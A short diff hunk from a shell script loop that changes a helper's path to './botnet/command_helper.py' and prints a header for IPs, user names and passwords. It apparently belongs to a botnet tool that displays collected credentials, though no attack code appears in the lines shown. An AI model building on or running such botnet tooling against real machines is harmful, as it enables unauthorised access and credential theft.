@@ -112,7 +112,7 @@ do
 	sleep 1
 	echo "IP , User name , Passwords are"
 	
-	python3 command_helper.py
+	python3 ./botnet/command_helper.py
 	
 	k=($k + 1)
 	echo "about to retart in few seconds"
